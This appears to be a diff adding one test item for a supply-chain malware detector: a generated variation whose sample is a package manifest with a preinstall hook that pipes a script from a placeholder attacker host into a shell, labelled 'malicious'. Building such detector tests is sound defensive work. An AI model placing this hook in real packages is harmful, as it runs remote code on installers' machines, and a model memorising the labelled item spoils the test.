@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::supply-chain-detector::98::structural-variations::5",
+  "base_sample_id": "exp::supply-chain-detector::98",
+  "generator_id": "structural-variations",
+  "generator_version": "1.0.0",
+  "seed": 400533622,
+  "content": "{\"input\": \"{\\\"scripts\\\": {\\\"preinstall\\\": \\\"curl -s https://evil.example.com/payload.sh | sh\\\"}}\\n\"}",
+  "content_hash": "72e536d395d785072513c67f15c017a2517e6529fce6a16929438afb01d1a128",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "structural:json",
+  "difficulty": "moderate"
+}
